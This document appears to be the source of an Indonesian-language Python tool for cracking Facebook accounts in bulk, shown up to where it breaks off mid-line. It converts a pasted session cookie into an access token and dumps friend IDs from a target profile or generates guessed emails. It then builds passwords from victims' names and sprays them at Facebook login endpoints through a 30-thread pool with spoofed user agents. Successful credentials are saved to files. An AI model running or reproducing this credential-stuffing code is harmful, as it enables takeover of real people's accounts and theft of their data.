Meledak=[]
Cik=[]
# ---------------- [ INSTALASI IMPORT ] -:--------------- #

from enum import auto
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
import inquirer,subprocess

# ---------------- [ INSTALASI FROM IMPORT ] ------------------ #

from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol,Console
from bs4 import BeautifulSoup as sop, BeautifulSoup
from rich.table import Table as me
from rich.columns import Columns as col, Columns
from inquirer.themes import Default
from pyfiglet import Figlet

# --------------- [ INSTALASI RICH PANEL ] ----------------- #

from time import time as CikKawan
from rich.panel import Panel as nel, Panel
from rich import print as prints
from rich.tree import Tree
from rich import pretty

###----------[ WARNA PRINT RICH ]---------- ###

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
console = sol()

# ------------- [ MENENTUKAN TANGGAL ] -------------- #

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tgl = datetime.datetime.now().day
skrng = datetime.datetime.now()
tahun, bulan, hari = skrng.year, skrng.month, skrng.day
tanggal = ("%s-%s-%s"%(hari,bulan_cek[bulan-1],tahun))
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# ---------------- [ METHODE PENGUNCI ] ------------------ #

loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
tokenku=[]
uid=[]
pwnya=[]
pwpluss=[]
cokbrut=[]
id = []
id2 = []
pretty.install()
CON=sol()
console=sol()
dump=[]
cokbrut=[]
xyz = requests.Session()
ses=requests.Session()
princp=[]
Merasa_udh_jagoan=[]
rr = random.randint
rc = random.choice

###----------[ GET PROXY ]----------###
###----------[ USER AGENT 1 ]----------###
ugen = []

    ###----------[ Str T12 ]---------- ### 
for apa in range(10000):
	versi_android = random.randint(4,13)
	versi_chrome = str(random.randint(300,325))+".35.0.17.116."+str(random.randint(1,8))+"."+str(random.randint(50,250))
	versi_app = random.randint(510000000,699999999)
	ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/{versi_chrome};FBPN/com.facebook.katana;FBLC/th_TH;FBBV/{versi_app};FBCR/Axis-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/{str(random.randint(4,10))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
	ugen.append(ugent)
	
for apa in range(10000):
	versi_android = random.randint(4,12)
	versi_android_2 = random.randint(6,21)
	versi_android_3 = random.randint(2,10)
	versi_chrome = str(random.randint(119,325))+"."+str(random.randint(49,398))+"."+str(random.randint(50,250))+"."+str(random.randint(20,450))
	ugent = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {versi_android}_{versi_android_2}_{versi_android_3}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Safari/537.36"
	ugen.append(ugent)
 
for xz in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 8.1.0; Gravity_5_GO Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.143 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazku4 = f"Mozilla/5.0 (Linux; Android 12; MP08 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]"
    uazku5 = f"Mozilla/5.0 (Linux; Android 13; TECNO Mobile KI8 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.175 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]"
    uazstart = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5]))
    ugen.append(uazstart)
#----------[ USER-CRACK ]----------#  

def Login_lagi():
    try:
        os.system('clear')
        ses = requests.Session()
        prints(Panel.fit("Jika Ingin Crack Tanpa Cookie bisa ketik 'Email'. Jangan Typo!"))
        cookie = input('\n╰─ Masukan Cookie : ')
        if cookie in ['Email']:
            Email()
        else:pass
        open('.cookie.txt','w').write(cookie)
        with requests.Session() as rsn:
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
                
                response = rsn.get(
                    'https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', 
                    cookies={'cookie': cookie}
                )
                
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    with open(".token.txt", "w") as file:
                        file.write(token)
                    print('Login Berhasil')
                else:
                    print('Login gagal')
            except:
                print('Gagal mendapatkan token')
            
            print('Berhasil! Jalankan lagi perintahnya.')
            time.sleep(1)
            menu()

    except Exception as e:
        os.system("rm -f .tok.txt")
        os.system("rm -f .cok.txt")
        print(f'Login gagal: {e}')
        exit()
	
def logo():
    prints(Panel.fit('  _________   _____ __________.____   __________ \n /   _____/  /     \\______   \    |  \______   \ \n \_____  \  /  \ /  \|     ___/    |   |    |  _/ \n /        \/    Y    \    |   |    |___|    |   \ \n/_______  /\____|__  /____|   |_______ \______  / \n        \/         \/                 \/      \/ ',style="bold blue"))

###----------[ BAGIAN MENU ]----------###
def menu():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cookie.txt', 'r').read()
    except IOError:
        print('cookies mu terkena cp')
        time.sleep(5)
        Login_lagi()
    os.system('clear')
    logo()
    prints(Panel(f"[bold white]1. Crack Publik \t\t2. Create Page \n3. Dump [ api/graphql ]\t\t4. Dump [ graph/api ]\n5. Crack from file\t\t6. Ua generator\n0. Logout\t\t\t7. Crack Email ",style='bold blue'))
    alya_ayang_kakang_X_yaya_and_cikawan = input(f'Pilih: ')
    if alya_ayang_kakang_X_yaya_and_cikawan in ['1']:
        dump()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['2']:
        prints(Panel(f"[bold green]\t\tCreate Page [bold white]",style="blue",width=50))
        name     = input(f"[ + ] masukan nama page cth = Alya Sayang ku : ")
        category = input(f"[ + ] masukan category page cth = 2214 : ")
        toket    = input(f"[ + ] masukan token : ")
        CreatePage(name=name, category=[category], token=toket)
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['3']:
        TimelineNoLogin()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['4']:
        Dump_graph()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['5']:
        crack_file()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['6']:
        ua = get_random_user_agent()
        ua2 = sistem_dalvik_ua()
        prints(Panel.fit(f'[#00C8FF]' + ua))
        prints(Panel.fit(f'[#00C8FF]' + ua2))
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['7']:
        Email()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print(f'Success logout')
        exit()
    else:
        exit()
        
def get_random_user_agent():
	user_agent_components = {
	'browser': ['Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android',],
	'build': ['Build/MMB29M; wv)','Build/TP1A.220624.014; wv)','Build/PPR1.180610.011; wv)','Build/TP1A.220624.014; wv)','Build/SP1A.210812.016; wv)','Build/RP1A.200720.012; wv)','Build/LMY48B; wv)','Build/QP1A.190711.020; wv)',],
	'version': ['SM-M146B','SM-M326B','SM-N971N','SM-N971U','SM-N986N','SM-N9860','SM-N986W','SM-N986U1','SM-N986U', 'SM-N986B','SM-M625F','SM-N7506V','SM-N7500Q', 'SM-N750L', 'SM-N7507', 'SM-N750S', 'SM-N750K', 'SM-N7505', 'SM-N750', 'SM-N7502', 'SM-N910C', 'SM-N910S', 'SM-N910H', 'SM-N910F', 'SM-N910G', 'SM-N910U', 'SM-N910K', 'SM-N916S', 'SM-N910L', 'SM-N916L', 'SM-N916K', 'SM-N910T3', 'SM-M3070', 'SM-M307FN', 'SM-M307F', 'SM-N9150', 'SM-N915A', 'SM-N915D', 'SM-N915D', 'SM-N915F', 'SM-N915FY', 'SM-N915G', 'SM-N915K', 'SM-N915S', 'SM-N915X', 'SM-M205M', 'SC-02K', 'SM-G960U', 'SM-N920CD', 'SHV-E250L', 'SM-N9208', 'GT-N7100', 'SM-G110B', 'SM-N915L', 'SM-N915T', 'SC-01G', 'SM-M205F', 'SM-G960X', 'SM-G960', 'SM-N920C', 'SGH-I317M', 'SM-N920', 'GT-N7105', 'SM-G730A', 'SM-N915P', 'SM-N915V', 'SM-M205G', 'SM-G960N', 'SM-G960U1', 'SM-G960W', 'SM-M135F', 'SGH-T889', 'SHV-E250S', 'SM-G110M', 'GT-I8190L', 'SM-N915R4,', 'SM-N915W8', 'SM-M205FN', 'SCV38', 'SM-G9600', 'SM-G960F', 'SM-M127F', 'SHV-E250K', 'SM-G110H', 'SM-G110B', 'GT-I8190N', 'SM-S918U', 'SM-S918U1', 'SM-S918W', 'SM-S918N', 'SM-S9180', 'SM-S918E', 'SM-G990F', 'GT-I8200', 'GT-I8200N', 'GT-I8200L', 'GT-I8190', 'SM-S918B', 'SM-G550T2', 'SM-S550TL', 'SM-G550T', 'SM-G550T1', 'SM-G5510', 'SM-G5528', 'SM-G550F', 'SM-G5500', 'SM-M136B', 'GT-I9515L', 'SM-M115M', 'SM-R855', 'SM-G860', 'SM-G860P', 'GT-I9505', 'GT-I9515', 'SGH-I337', 'SC-04E', 'SM-R845F', 'SM-R855U', 'SM-R845U', 'SM-G530FZ', 'SM-G530H', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530W', 'SM-M115F', 'GT-P6200', 'GT-S5360', 'SM-R850', 'SM-R840', '600GN', 'SM-G530Y', 'SM-G5308W', 'SM-G530AZ', 'SM-G5309W', 'SM-G530BT', 'SM-G530FZ', 'SM-G530A', 'SM-G530M', 'SM-G531BT', 'SM-G530MU', 'M2004J19C', 'M2006C3LG', 'SM-G5306W', 'SM-G531Y', 'SM-G530T1', 'SM-G531M', 'SM-G530FQ', 'SM-G530F', ],
	'os': ['AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2. Chrome/',' AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/', ],
	'mobile': ['Mobile Safari/537.36', ], 
	'fb_waf': ['[FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]','[FB_IAB/FB4A;FBAV/406.0.0.26.90;]','[FB_IAB/FB4A;FBAV/404.0.0.35.70;]','[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]','[FB_IAB/FB4A;FBAV/406.0.0.17.90;]','[FB_IAB/FB4A;FBAV/405.0.0.23.72;]','[FB_IAB/FB4A;FBAV/405.1.0.28.72;]','[FB_IAB/FB4A;FBAV/396.0.0.21.104;]','[FB_IAB/FB4A;FBAV/385.0.0.32.114;]','[FB_IAB/FB4A;FBAV/387.0.0.24.102;]'],}
	browser = random.choice(user_agent_components['browser'])
	app = random.randint(2,13)
	build = random.choice(user_agent_components['build'])
	version = random.choice(user_agent_components['version'])
	os = random.choice(user_agent_components['os'])
	language = str(random.randint(50,199)) + ".0." + str(random.randint(2999,5999)) + "." + str(random.randint(50,150))
	mobile = random.choice(user_agent_components['mobile'])
	fb = random.choice(user_agent_components['fb_waf'])
	ua_oppo = f'{browser} {app}; {version} {build} {os}{language} {mobile} {fb}'
	return ua_oppo

def sistem_dalvik_ua():
	user_componen = {
		'mes': ['MessengerLite','Orca-Android','FB4A',],
		'com' : ['com.facebook.mlite','com.facebook.orca','com.facebook.katana',],
		'loc' : ['en_US','th_TH','vi_VN','id-ID','jp-JP',],
		'fbcr' : ['Airtel','TNT','TRUE-H','AIS','null','T-Mobile',],
		'model' : ['LGE','INFINIX MOBILITY LIMITED','OPPO','samsung','oppo','vivo','infinix','redmi','realmi','lg','asus',],
		'mod' : ['lge','Infinix','OPPO','samsung','Redmi','Realmi','lg','Asus','POCO','XIOMI',],
		'jenis' : ['L-03K','Infinix X688B','CPH1909','SM-A720F','SM-G532G','SM-G3518',],
	}
	messeger = random.choice(user_componen['mes'])
	ip = str(random.randint(100,299)) + '.0.0.' + str(random.randint(1,99)) + '.' + str(random.randint(99,299))
	com_facebook = random.choice(user_componen['com'])
	lokasi = random.choice(user_componen['loc'])
	fbv = str(random.randint(1999999,59999999))
	face = random.choice(user_componen['fbcr'])
	model = random.choice(user_componen['model'])
	mod = random.choice(user_componen['mod'])
	jenis = random.choice(user_componen['jenis'])
	fbs = str(random.randint(1,10))
	fbs1 = str(random.randint(1,10)) + '.' + str(random.randint(0,5)) + '.' + str(random.randint(0,3))
	FBSV = random.choice([fbs,fbs1])
	densi = "{density=" + str(random.randint(1,3)) + ".0,width=" + str(random.randint(720,1920)) + ",height=" + str(random.randint(720,1920)) + "};FB_FW/1;FBRV/" + str(random.randint(19999999,499999999)) + ";]"
	ua = f"[FBAN/{messeger};FBAV/{ip};FBPN/{com_facebook};FBLC/{lokasi};FBBV/{fbv};FBCR/{face};FBMF/{model};FBBD/{mod};FBDV/{jenis};FBSV/{FBSV};FBCA/x86:armeabi-v7a;FBDM/{densi}"
	return ua


def Email():
    print("")
    prints(Panel.fit(f'\tMAIL CRACK',style='bold green'))
    print("")
    dump=[]
    rc = random.choice
    rr = random.randint
    xc = ['achmad','mas','mochammad','muhammad','jaki','juned','fikri','dika','nanang','agus','bode','acill','ilham','eka','toni','toto','bagus','bagas','joko','erik','samsul','udin','ucup','endang','dudung','putra','bondol','cecep','jamal','rifki','cicih','cucu','iis','dahlia','imas','nanda','nazwa','zahra','zahwa','fitri','neni','encin','titin','yoyoh','iin','ineke','andin','tari','ninis','nesya','firda','septi','lasma','mutia','mpit','sifa','siti','syifa','zahra','elin','mela']
    blk = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','maulana','ramdani','ramadan','mulyana','irawan','susanto','saputra','sinaga','mulyono','wibowo','wirawan','hermawan','darmawan','hermanto','sulaeman','kurniawan','setiawan','sukaesih','aprilia','apriliani','rahayu','lestari','safitri','nurhasanah','fatimah','aisyah','nurjanah','khoerunisa','fadilah','ningsih','yuningsih','ningsih','nengsih','suningsih','yulianti','julianti','pertiwi','pratiwi','mulyani','wahyuni','hutagalung','suherni','damayanti','kartika','kartini','dimas','riski','agus','fadil','tiawan','aprianto','bimasakti','gilang','ardian','purtianto','saleh','caca','rani','puspita','santi','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','77','01','02','03','04','06','07','08','08','09','11','11']
    global ok , cc
    nama = input(f'[ × ] nama target : ')
    if ',' in str(nama):
        print(f'└─ masukan nama, jangan kosong ')
        time.sleep(3);exit()
    doma = input(f'[ × ] domain (ex:@gmail.com) : ')
    if '@' not in str(doma) or '.com' not in str(doma):
        print(f'└─ masukkan domain dengan benar ')
        time.sleep(3);exit()
    jumlah = input(f'[ × ] total dump (max:10000) : ')
    for xyz in range(int(jumlah)):
        AA = nama
        BB = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
        CC = doma
        DD = f'{AA}'
        if DD in id:pass
        else:id.append(DD+'|'+nama)
        if len(dump)==999999:auto()
        sys.stdout.write(f"\r[ + ] berhasil mengumpulkan {asu}{len(id)} {P}email...");sys.stdout.flush()
        time.sleep(0.0000003)
    print("")
    setting()	
	

def crack_file():
    file = input(f'Masukan Nama File Yang Di Sdcard Anda : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:id.append(data)
            except:exit(f" [{M}>{P}] pemisah salah")
            print('\r sedang dump %s id'%(len(id)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    print(f'\rtotal jumlah akun dump adalah {len(id)}')
    setting()
###----------[ DUMP ID PUBLIK ]----------###

def dump():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cookie.txt', 'r').read()
    except IOError:
        print('cookies mu terkena cp')
        time.sleep(5)
        Login_lagi()
    fields =''
    idt = input(f'[{H}>{N}] Masukan Idz Target : ')
    try:
        headers = {
            "connection": "keep-alive", 
            "accept": "*/*", 
            "sec-fetch-dest": "empty", 
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin", 
            "sec-fetch-user": "?1",
            "sec-ch-ua-mobile": "?1",
            "upgrade-insecure-requests": "1", 
            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9"
        }
        if len(id) == 0:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday)"
            }
        else:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday).after({fields})"
            }
        url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cok).json()
        for i in url["friends"]["data"]:
            id.append(i["id"]+"|"+i["name"])
            sys.stdout.write(f"\r[{H}>{N}] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
            sys.stdout.flush()
        dump(idt,url["friends"]["paging"]["cursors"]["after"],cok,token)
    except:pass
    # setting()
    

###----------[ ATUR SBLUM KREK ]----------###
def setting():
    prints(Panel(f"[bold white]1. Crack Account  \n2. Crack Account New  \n3. Crack Account Random ",style='blue'))
    Al_alya = input(f"[ > ] masukan pilihan menu : ")
    if '1' in Al_alya:
        for tua in sorted(id):
            id2.append(tua)
    elif '2' in Al_alya:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif '3' in Al_alya:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('╰─ input correctly ');exit()
    prints(Panel(f"[bold white]1. Metode Account Api [ Data selain telkom ]",style='blue'))
    prints(Panel(f"[bold white]2. Metode Account Reguler Api V2 [ Wifi Indihome ]",style='blue'))
    prints(Panel(f"[bold white]3. Metode Account Validate Free [ Data all operator ]",style='blue'))
    Al_alya = input(f"[ > ] masukan pilihan menu : ")
    if '1' in Al_alya:
        method.append('api')
    elif '2' in Al_alya:
        method.append('valid')
    elif '3' in Al_alya:
        method.append('touch')
    else:method.append('api')
    passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
    global prog,des,loop
    print("")
    loop+=len(id)
    Cik.append(Panel(f"[bold white]OK : %s[bold white]"%(okc),style="bold green"))
    Cik.append(Panel(f"[bold white]CP : %s[bold white]"%(cpc),style="bold green"))
    console.print(Columns(Cik))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(id))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = []
                pwv = []
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'321')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'321')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'api' in method:
                    pool.submit(crackapi,idf,pwv)
                elif 'valid' in method:
                    pool.submit(crack2,idf,pwv)
                elif 'touch' in method:
                    pool.submit(crack,idf,pwv)
                else:
                    pool.submit(crackapi,idf,pwv)
        print('')
        sys.stdout.write('Berhasil Mengcrack %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
        print('')


def crackapi(idf, pwv):
    global loop, ok, cp
    bi = random.choice(['\33[m'])
    pers = loop * 100 / len(id2)
    fff = '%'
    ses = requests.Session()
    prog.update(des, description=f'{(loop)} ok : {(ok)} cp : {(cp)}')
    prog.advance(des)
    ua = random.choice(ugen)
    #ua = 'Mozilla/5.0 (Linux; Android 11; RMX3581 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36'
    ses = requests.Session()
    for pw in pwv:
        try:
            params = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","sdk_version": {random.randint(1,26)}, "email": idf,"locale": "en_US","password": pw,"sdk": "android","generate_session_cookies": "1","sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
            headers = {"Host": "graph.facebook.com","x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
            post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
            if "session_key" in post.text and "EAA" in post.text:
                ok += 1
                Alya = Tree(Panel.fit(f"Login Successfully", style="bold green"))
                Alya.add(Panel.fit(f"{idf} | {pw}", style="bold green"))
                prints(Alya)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + '\n')
                break
            elif "User must verify their account" in post.text:
                Alya = Tree(Panel.fit(f"Login checkpoint", style="bold yellow"))
                Alya.add(Panel.fit(f"{idf} | {pw}", style="yellow")).add(Panel.fit(f"{ua}", style="yellow"))
                prints(Alya)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop -= 1

def crack(idf, pwv):
    global loop, ok, cp
    ses = requests.Session()
    prog.update(des, description=f'{loop} ok : {ok} cp : {cp}')
    prog.advance(des)
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            link = ses.get(f"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1736472639792%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4d9b57a435e11ba5%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dpopup%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26locale%3Den_US%26logger_id%3Dff5c4fef7e3d5cc40%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbfa713d78e1cd783%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%2526frame%253Df43043cb59adc9703%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfbfa713d78e1cd783%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff71f33a48b104696%26relation%3Dopener%26frame%3Df43043cb59adc9703%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0").text
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', link).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', link).group(1),
                "prefill_contact_point": "",
                "prefill_source": "",
                "prefill_type": "",
                "first_prefill_source": "",
                "first_prefill_type": "",
                "had_cp_prefilled": False,
                "had_password_prefilled": False
            }
            headers = {
                "Host": "m.facebook.com",
                "content-length": "479",
                "cache-control": "max-age=0",
                "upgrade-insecure-requests": "1",
                "origin": "https://m.facebook.com",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": ua,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "x-requested-with": "com.opera.mini.native",
                "sec-fetch-site": "same-origin",
                "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "priority":"u=0, i",
                "sec-ch-ua-platform":'"macOS"',
                "sec-ch-ua-mobile":"?0",
                "upgrade-insecure-requests":"1",
                "referer": 